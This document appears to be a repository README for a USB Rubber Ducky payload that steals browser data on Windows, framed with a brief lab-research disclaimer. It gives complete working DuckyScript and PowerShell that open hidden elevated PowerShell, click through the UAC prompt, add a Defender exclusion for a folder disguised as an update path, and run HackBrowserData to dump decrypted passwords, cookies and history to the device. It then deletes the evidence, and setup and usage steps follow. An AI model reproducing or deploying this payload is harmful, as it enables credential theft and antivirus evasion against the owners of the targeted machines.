# README: USB Rubber Ducky 3.0 - Browser Data Exfiltration Research

---

## Overview

This repository contains a two-stage payload for the **Hak5 USB Rubber Ducky 3.0** that demonstrates browser data exfiltration on Windows 10/11 systems using a staged architecture.

> **DISCLAIMER:** This project was created strictly for **educational and research purposes** in a **controlled, isolated lab environment.** The techniques demonstrated here should **never** be used against systems you do not own or have explicit written permission to test. Unauthorized use of these tools is illegal and unethical.

---

## Prerequisites

### Hardware Required:
- Hak5 USB Rubber Ducky 3.0
- Target Windows 10/11 machine

### Software Required:
- **Hak5 Payload Studio** (to compile `payload-browser-breacher-v2.txt` → `inject.bin`)
- **HackBrowserData v0.4.6 (64bit)** → [GitHub Releases](https://github.com/moonD4rk/HackBrowserData/releases)
- Target machine must have **Local Administrator** privileges

### Target Compatibility:
| OS | Status | Notes |
|-----|--------|-------|
| Windows 11 | Tested | Primary test environment |
| macOS | Not supported | Payload is Windows-specific |
| Linux | Not supported | Payload is Windows-specific |

---

## How it Works ( must read )

In general, the point of this script is to infiltrate target machine and gather data such as history, passwords, usernames, credentials and more from different browsers, supported by the additional tool ( HackBrowserData ). Due to some technical issue with running the script, I use that tool for only three specific browsers to avoid problems and improve debugging / testing.  
The structure is divided into two-staged build, which in this case means that DuckyScript acts as a stager script to bypass policy restrictions and run Powershell script as the main extractor. I found it the best way to use Ducky, because it allows to create complex structures, without having to restrict yourself to DuckyScript only.

```
┌─────────────────────────────────────────────────────────┐
│                    ATTACK FLOW                          │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  [Ducky Inserted]                                       │
│        ↓                                                │
│  [Ducky mounts as HID + Storage]                        │
│        ↓                                                │
│  STAGE 1: DuckyScript (inject.bin)                      │
│  ├── Opens Run Dialog (GUI r)                           │
│  ├── Types PowerShell launch command                    │
│  ├── Elevates to Administrator (CTRL-SHIFT ENTER)       │
│  ├── Bypasses UAC prompt (ALT y)                        │
│  └── Finds Ducky drive + launches run.ps1               │
│        ↓                                                │
│  STAGE 2: PowerShell (run.ps1)                          │
│  ├── Finds Ducky drive letter ($d)                      │
│  ├── Checks for Admin privileges (SID check)            │
│  ├── Creates SafeZone folder (C:\Windows\Temp\Update)   │
│  ├── Adds Defender exclusion for SafeZone               │
│  ├── Copies h.exe from Ducky to SafeZone                │      
│  ├── Runs h.exe against each browser individually       │
│  ├── Saves loot directly to Ducky                       │
│  └── Deletes SafeZone (removes all evidence)            │
│        ↓                                                │
│  [Loot saved to Ducky as JSON files]                    │
│        ↓                                                │
│  [Ducky removed - Attack Complete]                      │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

**Total Attack Time:** ~15–25 seconds ( depending on number of browsers and data size it could be longer )

---

## File Documentation

### Stage 1: `payload-browser-breacher-v2.txt` (DuckyScript)

```ducky
REM_BLOCK
    TITLE: Offline Browser Breacher version 2 (stager method)
    AUTHOR: Szymon Stefański
    DESCRIPTION: Bypasses network filters by running a stager script, that runs PowerShell program on target machine directly from Ducky.
END_REM

DEFAULT_DELAY 100

ATTACKMODE HID STORAGE

BUTTON_DEF
    GUI r
    DELAY 500
    REM This line down here open PowerShell in silent mode with no window, bypassing restrictions for scripts
    STRING powershell -ep bypass -NoProfile -w h
    CTRL-SHIFT ENTER
    DELAY 1500
    ALT y
    DELAY 3000
    REM We unblock the PowerShell script to make sure it won't be interrupt during running
    STRINGLN $d=(gwmi Win32_Volume -f 'DriveType=2').DriveLetter;
    DELAY 1000
    STRINGLN Unblock-File $d\run.ps1;
    DELAY 1000
    STRINGLN & $d\run.ps1;
END_BUTTON
```

**Short Explanation**

This file's goal is to open up Powershell as admin in hidden mode, for better stealth, and not only run the Powershell script, but unblock it from potential Windows Defender's actions ( Execution Policy bypass also allows to run scripts without need for approvement )

**Key Commands Explained:**

| Command | Purpose |
|---------|---------|
| `DEFAULT_DELAY 100` | Adds 100ms pause after every command to prevent buffer overflow |
| `ATTACKMODE HID STORAGE` | Ducky acts as keyboard AND USB drive simultaneously |
| `GUI r` | Opens the Windows Run dialog |
| `-ep bypass` | Bypasses PowerShell Execution Policy |
| `-NoProfile` | Skips user profile (faster, avoids profile-based logging) |
| `-w h` | Hides the PowerShell window completely |
| `CTRL-SHIFT ENTER` | Triggers "Run as Administrator" |
| `ALT y` | Clicks "Yes" on the UAC elevation prompt |
| `Unblock-File` | Removes "Mark of the Web" security flag from run.ps1 |

---

### Stage 2: `run.ps1` (PowerShell)

```powershell
$d = (gwmi Win32_Volume -Filter "DriveType=2").DriveLetter
$safe = "C:\Windows\Temp\Update"

# Get the user (not Administrator)
$User = (Get-WmiObject -Class Win32_ComputerSystem).UserName.Split('\')[-1]
$Profile = "C:\Users\$User"

# Get admin SID ( no matter the name type )
if ([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups -match 'S-1-5-32-544')) {
    Add-MpPreference -ExclusionPath $safe -ErrorAction SilentlyContinue
}

md $safe -Force
copy "$d\tools\h.exe" "$safe\h.exe"

# Create loot directory
md "$d\LOOT" -Force
cd "$d\LOOT"

& "$safe\h.exe" -b edge -f json --dir "$d\LOOT\Edge"

& "$safe\h.exe" -b chrome -f json --dir "$d\LOOT\Chrome"

& "$safe\h.exe" -b operagx -f json --dir "$d\LOOT\Opera"

rm $safe -Recurse -Force
```
**Short Explanation**

You could say this is the main 'heart' of the attack. Once Ducky prepares everything, this Powershell script performs the attack using HackBrowserData tool. However before that, it also sets the Ducky's Drive Letter to save folders there and checks for admin identity to add exlusion path for the $safe directory.   $Safe is just a place where the program will be compied and run from, it is supposed to be a path not only looking like something legit ( "C:\Windows\Temp\Update" ), but also, thanks to the exlusion, a place where the program can run safely without risk of being deleted, interrupt etc.

**Key Lines Explained:**

| Line | Purpose |
|------|---------|
| `$d = (gwmi Win32_Volume...)` | Finds the Ducky's drive letter (F:, G:, etc.). We use it to later create and save folders / data on Ducky. However if there are mutliple drivers of the same type, it is also a good option to use some sort of tag, like ducky.tag and add it to the DriverLetter setting, like this: `$d= ...  ? {Test-Path "$($_.DriveLetter)\ducky.tag"}).DriveLetter` |
| `$safe = "C:\Windows\Temp\Update"` | SafeZone path (mimics legitimate Windows update) |
| `S-1-5-32-544` | Windows SID for Administrators group (language-independent) |
| `Add-MpPreference -ExclusionPath` | Tells Defender to ignore the SafeZone folder |
| `-b edge / chrome / operagx` | Targets each browser individually (prevents panic crash) |
| `rm $safe -Recurse -Force` | Deletes all evidence before Defender's post-scan |

---

## Setup Instructions

### Step 1: Prepare Ducky
1. Insert the MicroSD into your computer using a card reader.
2. Create the following folder structure:
   ```
   MicroSD Root/
   ├── tools/
   │   └── h.exe      ← Copy HackBrowserData here ( I left zip file in this repo, so you can just extract it )
   ```
3. If you don't have a MicroSD card reader, insert Rubber Ducky normally via USB and press the button near the USB end
to open mass storage mode.

### Step 2: Download / Extract HackBrowserData
1. Go to the [HackBrowserData Releases Page](https://github.com/moonD4rk/HackBrowserData/releases).
2. Download **`hack-browser-data-windows-64bit.zip`**.
3. Extract the `.zip` and rename the `.exe` to **`h.exe`**.
4. Copy `h.exe` into the `tools/` folder on the MicroSD.

### Step 3: Add Defender Exclusion on host Machine
Before copying `h.exe`, add your MicroSD drive to Windows Defender exclusions on your own PC to prevent it from being deleted during setup, I highly recommend doing so, as my Antivirus was happy to delete my files during management.

### Step 4: Copy the Scripts
1. Copy `run.ps1` to the **root** of Ducky's files.
2. Copy `inject.bin` ( generated from Hak5 PayloadStudio using `payload-browser-breacher-v2.txt` ) to the **root** of Ducky's files.

---

## Usage Instructions

### Running the Payload:
1. **Insert the Rubber Ducky** into any available USB port on the target.
2. **Press the button** on the Ducky to trigger the payload ( if you have a hard time finding it, it is little down under the USB end, but be careful with using too much force on this ).
4. **Watch the Run dialog** appear briefly (if `-w h` is working, nothing will be visible). If you want to debug the script, just delete those options from DuckyScript.
5. **Wait** for approximately 15–25 seconds ( could be longer ).
6. **Remove the Ducky** when the script finishes.

### Reading the Loot:
After removing the Ducky, plug it into your machine and navigate to the `LOOT` folder:

```
LOOT/
├── Edge/
│   ├── edge_password.json      ← Decrypted passwords
│   ├── edge_cookie.json        ← Session cookies
│   ├── edge_history.json       ← Browsing history
│   └── edge_bookmark.json      ← Saved bookmarks
├── Chrome/
│   ├── chrome_password.json
│   ├── chrome_cookie.json
│   └── chrome_history.json
└── Opera/
    ├── operagx_password.json
    ├── operagx_cookie.json
    └── operagx_history.json
```

---

## Known Limitations 

Read the `Penetration testing research report (Ducky)` to learn more about the lab enviroment and issues.

---

## References

| Resource | Link |
|----------|------|
| Hak5 Rubber Ducky Documentation | https://docs.hak5.org/hak5-usb-rubber-ducky |
| HackBrowserData GitHub | https://github.com/moonD4rk/HackBrowserData |
| MITRE ATT&CK ( Input Injection ) | https://attack.mitre.org/techniques/T1674/ |
| Microsoft DPAPI Documentation | https://learn.microsoft.com/en-us/windows/win32/secdp/data-protection-api |
| Microsoft Tamper Protection | https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection |
| DuckyScript 3.0 Reference | https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference |

---

## Author

**Szymon Stefański**